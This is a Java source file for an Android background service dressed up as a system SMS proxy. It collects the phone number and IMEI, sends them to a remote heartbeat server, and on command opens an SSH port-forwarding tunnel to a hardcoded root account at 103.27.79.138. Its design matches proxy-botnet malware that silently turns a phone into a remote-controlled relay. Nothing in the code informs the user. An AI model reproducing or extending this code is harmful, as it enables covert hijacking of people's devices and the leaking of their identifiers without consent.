package com.android.sms.proxy.service;

import android.content.Context;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.BindServiceEvent;
import com.android.sms.proxy.entity.HeartBeatInfo;
import com.android.sms.proxy.entity.HeartBeatJson;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.function.RequestManager;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.assist.AESCrypt;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.volley.NoConnectionError;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;
import com.umeng.analytics.MobclickAgent;

import org.connectbot.bean.PortForwardBean;
import org.connectbot.service.TerminalManager;
import org.connectbot.transport.TransportFactory;
import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

/**
 * @author zyq 16-3-10
 */
public class HeartBeatRunnable implements Runnable {

	private static final boolean DEBUG = true;
	private static final String TAG = "heartBeatRunnable";
	public static boolean isSSHConnected = false;
	public static int mCurrentCount = 0;
	public static String phoneNumber;
	public static String imei;
	private Loader_Base_ForCommon<HeartBeatJson> mLoader;
	private Context mContext;
	public static boolean isStartSSHBuild = false;
	private Object mSync = new Object();
	public static int waitForCount = 0;
	private String host;
	private HeartBeatService mHeartBeatService;

	public HeartBeatRunnable(Context context, HeartBeatService service) {
		this.mContext = context;
		mLoader = Loader_Base_ForCommon.getInstance();
		mHeartBeatService = service;
	}

	@Override
	public void run() {
		try {
			if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
			if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
			if (TextUtils.isEmpty(phoneNumber)) return;

			if (DEBUG) {
				Log.d(TAG, "模拟接收到接口500毫秒");
				mCurrentCount++;
				synchronized (mSync) {
					mSync.wait(500);
				}
				initDebug();
			} else {
				Map<String, String> map = new HashMap<>();
				map.put(NativeParams.TYPE_PHONE_NUMBER, phoneNumber);
				map.put(NativeParams.TYPE_PHONE_IMEI, imei);
				map.put(NativeParams.TYPE_SSH_CONNECT, String.valueOf(isSSHConnected));
				String params = RequestManager.getAuthStr(NativeParams.AES_KEY, map);

				Log.d(TAG, "参数解密后：" + AESCrypt.decrypt(NativeParams.AES_KEY, params));

				Map<String, String> map1 = new HashMap<>();
				map1.put("s", params);
				RequestEntity<HeartBeatJson> entity = new RequestEntity<HeartBeatJson>(NativeParams.URL_HEART_BEAT,
						HeartBeatJson.class, map1);
				mLoader.onRequestLoadNetworkTask(entity, true, new Response.Listener() {
					@Override
					public void onResponse(Object response) {
						if (response instanceof HeartBeatJson) {
							handleResponse((HeartBeatJson) response);
						}
					}
				}, new Response.ErrorListener() {
					@Override
					public void onErrorResponse(VolleyError error) {
						if (error instanceof NoConnectionError) {
							//应该修改心跳包时间！！！！！！！！！！！
//							if (mHeartBeatService != null) {
//	                            //mHeartBeatService.cancelScheduledTasks();
//								//改为６０秒重新启动
//								//mHeartBeatService.scheduledWithFixedDelay(60);
//							}
						}
						FlurryAgent.onError(TAG, "", error.fillInStackTrace());
						onErrorReport(error);

					}
				});
			}

		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
			onErrorReport(e);
		}
	}

	private void initDebug() {
		HeartBeatJson json = new HeartBeatJson();
		HeartBeatInfo info = new HeartBeatInfo();
		int sourcePort = new Random().nextInt(8000) + 40000;
		info.setPort("root@103.27.79.138:" + String.valueOf(sourcePort));
		if (!isSSHConnected) {
			if (mCurrentCount > 3 && !isStartSSHBuild) {
				info.setStatusType(HeartBeatInfo.TYPE_START_SSH);
				isStartSSHBuild = true;
			} else if (mCurrentCount > 3 && isStartSSHBuild) {
				info.setStatusType(HeartBeatInfo.TYPE_WAITING_SSH);
			} else {
				info.setStatusType(HeartBeatInfo.TYPE_IDLE);
			}
		} else {
			if (mCurrentCount < 1000) {
				info.setStatusType(HeartBeatInfo.TYPE_BUILD_SSH_SUCCESS);
			} else {
				info.setStatusType(HeartBeatInfo.TYPE_CLOSE_SSH);
			}
		}
		json.setCode(0);
		json.setData(info);

		handleResponse(json);
	}


	private void handleResponse(HeartBeatJson result) {
		int code = result.getCode();
		if (code == NativeParams.SUCCESS) {
			HeartBeatInfo info = result.getData();
			if (info != null) {
				int type = info.getStatusType();
				switch (type) {
					case HeartBeatInfo.TYPE_IDLE:
						if (DEBUG) {
							Log.d(TAG, "暂时没事干");
						}
						break;
					case HeartBeatInfo.TYPE_START_SSH:
						if (DEBUG) {
							Log.d(TAG, "开始建立ssh隧道");
						}
						host = info.getPort();
						handleStartSSH(host);
						break;
					case HeartBeatInfo.TYPE_WAITING_SSH:
						waitForCount++;
						if (waitForCount == 10) {
							waitForCount = 0;
							host = info.getPort();
							handleStartSSH(host);
						} else {
							if (DEBUG) {
								Log.d(TAG, "等待ssh建立完毕");
							}
						}
						break;
					case HeartBeatInfo.TYPE_BUILD_SSH_SUCCESS:
						try {
							if (DEBUG) {
								Log.d(TAG, "建立隧道成功");
							}
							//printMessage = "建立隧道成功,改变心跳时间为20秒";
							//printMessage(printMessage);
							//HeartBeatService.getInstance().cancelScheduledTasks();
							//HeartBeatService.getInstance().restScheduledTasks();
						} catch (Exception e) {
							if (DEBUG) {
								Log.e(TAG, e.fillInStackTrace().toString());
							}
						}
						break;
					case HeartBeatInfo.TYPE_CLOSE_SSH:
						try {
							if (DEBUG) {
								Log.d(TAG, "关闭隧道");
							}
							isSSHConnected = false;
							IProxyControl proxyService = HeartBeatService.getInstance().getmProxyControl();
							if (proxyService != null) {
								proxyService.stop();
							}
							TerminalManager manager = HeartBeatService.getInstance().getBinder();
							if (manager != null) {
								manager.disconnectAll(true, false);
							}
						} catch (Exception e) {
							if (DEBUG) {
								Log.d(TAG, e.fillInStackTrace().toString());
							}
						}
						break;
				}
			}
		}
	}


	//开始启动SSH
	private void handleStartSSH(String quickConnectString) {
		try {
			if (ProxyServiceUtil.isHostValid(quickConnectString, "ssh")) {
				final int endIndex = quickConnectString.indexOf(":");
				final String host = quickConnectString.substring(0, endIndex);
				Uri uri = TransportFactory.getUri("ssh", host);

				ProxyServiceUtil.getInstance(mContext).setHostBean(uri);
				int startIndex = quickConnectString.indexOf(":");
				String sourcePort = quickConnectString.substring(startIndex + 1);
				//int sourcePort = new Random().nextInt(8000) + 40000;
				if (DEBUG) {
					Log.d(TAG, "vps分配到的host本地端口是:" + sourcePort);
				}
				ProxyServiceUtil.getInstance(mContext).setPortFowardBean(mContext, String.valueOf(sourcePort));

				//开始启动服务
				PortForwardBean bean = ProxyServiceUtil.getInstance(mContext).getPortFowardBean();
				if (bean != null && !TextUtils.isEmpty(bean.getDescription()) && !TextUtils.isEmpty(bean.getDestAddr()
				)) {
					EventBus.getDefault().post(new BindServiceEvent());
				}
			} else {
				if (DEBUG) {
					Log.d(TAG, "返回的host格式不正确");
				}
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
			onErrorReport(e);
		}
	}


	public void onErrorReport(Throwable e){
		MobclickAgent.reportError(mContext,e);
	}

}
